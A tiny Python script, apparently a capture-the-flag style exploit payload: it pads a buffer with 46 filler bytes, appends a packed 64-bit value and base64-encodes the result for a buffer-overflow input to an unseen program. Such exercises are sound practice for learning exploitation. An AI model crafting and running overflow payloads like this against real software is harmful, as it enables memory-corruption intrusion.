
import sys
import struct
import base64

buf = b'kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk'
buf += struct.pack('<Q', 13182744427239319386)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
